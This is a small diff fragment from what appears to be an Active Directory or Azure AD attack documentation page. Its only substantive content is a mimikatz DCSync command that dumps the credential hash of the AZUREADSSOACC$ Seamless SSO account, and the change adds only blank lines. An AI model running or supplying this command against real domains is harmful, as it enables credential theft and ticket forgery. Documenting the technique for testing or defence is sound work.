@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:19:22.599013+00:00'
 ```bash
 mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit
 ```
+
+
